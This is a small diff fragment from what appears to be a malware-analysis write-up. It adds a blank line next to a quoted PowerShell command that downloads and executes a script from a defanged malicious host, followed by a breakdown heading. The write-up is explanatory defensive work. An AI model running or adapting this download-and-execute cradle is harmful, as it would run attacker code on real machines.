@@ -114,6 +114,7 @@ iex (new-object net.webclient).downloadstring('hxxp[://]files[.]bpakcaging[.]xyz
 
 As a note, the link above has been defanged. This also applies for the links in the following analysis.
 
+
 Step-by-step Breakdown:
 
 iex
